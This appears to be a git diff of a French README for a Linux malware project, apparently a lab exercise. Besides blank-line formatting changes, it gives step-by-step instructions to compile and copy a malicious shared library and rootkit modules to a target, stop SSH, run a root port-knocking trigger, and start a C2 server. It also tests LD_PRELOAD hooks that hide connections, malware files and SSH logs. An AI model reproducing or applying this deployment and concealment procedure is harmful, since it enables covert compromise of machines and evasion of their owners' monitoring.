@@ -17,7 +17,8 @@ Le malware est activé via un mécanisme de Port Knocking nécessitant une séqu
 
 📂 Installation & Exécution
 #  1- Configuration des IPs
-    Avant de compiler, assurez-vous de configurer les IP correctes dans les fichiers malware.c et server.c :
+Avant de compiler, assurez-vous de configurer les IP correctes dans les fichiers malware.c et server.c :
+
 ```
 #define C2_IP "192.168.18.128"  // IP du serveur C2
 #define TARGET_IP SI"192.168.18.130"  // IP de la machine cible
@@ -26,6 +27,7 @@ Le malware est activé via un mécanisme de Port Knocking nécessitant une séqu
 
 # 2- Compilation du projet
 Sur la machine serveur C2, utilisez make pour compiler tous les fichiers 
+
 ```
 make 
 
@@ -40,12 +42,14 @@ Cela génère les exécutables suivants :
 
 # 3-  Transfert des fichiers vers la machine cible
 Transférez les fichiers générés (sauf server) vers /tmp/ sur la machine cible :
+
 ```
 scp port_knock malware.so hide_connections.so hide_files.so hide_logs.so user@192.168.18.130:/tmp
 
 ```
 # 4-  Préparation de la machine cible
 Sur la machine cible, désactivez SSH et préparez l’environnement :
+
 ```
 sudo systemctl stop ssh
 sudo mkdir -p /run/sshd
@@ -55,14 +59,17 @@ sudo chmod 755 /run/sshd
 
 # 5- Lancement du Port Knocking
 Sur la machine cible, exécutez port_knock en mode root dans le dossier /tmp:
+
 ```
 sudo ./port_knock
 ```
 
 # 6- Lancement du serveur C2
 Sur la machine serveur C2 :
+
 ```
 ./server
+
 ```
 Le serveur attend la frappe secrète des ports pour activer le malware.
 
@@ -78,22 +85,28 @@ Lorsque le C2 envoie des paquets aux ports 1111, 2222 et 3333, la machine cible 
 # 9- Tests & Vérifications
 Masquer les connexions réseau
 Sur la machine cible, exécutez :
+
 ```
 sudo LD_PRELOAD=/tmp/hide_connections.so netstat -tulnp
+
 ```
     => Les ports 1111, 2222 et 3333 doivent être invisibles.
 
 # 10- Masquer les fichiers malveillants
 Sur la machine cible, exécutez :
+
 ```
 sudo LD_PRELOAD=/tmp/hide_files.so ls -la /tmp
+
 ```
     => Les fichiers du malware (malware.so, hide_*.so) ne doivent pas apparaître.
 
 # 11- Masquer les logs
 Sur la machine cible, exécutez :
+
 ```
 sudo LD_PRELOAD=/tmp/hide_logs.so journalctl -xe
+
 ```
     => Les logs liés aux connexions SSH ne doivent plus apparaître.
 
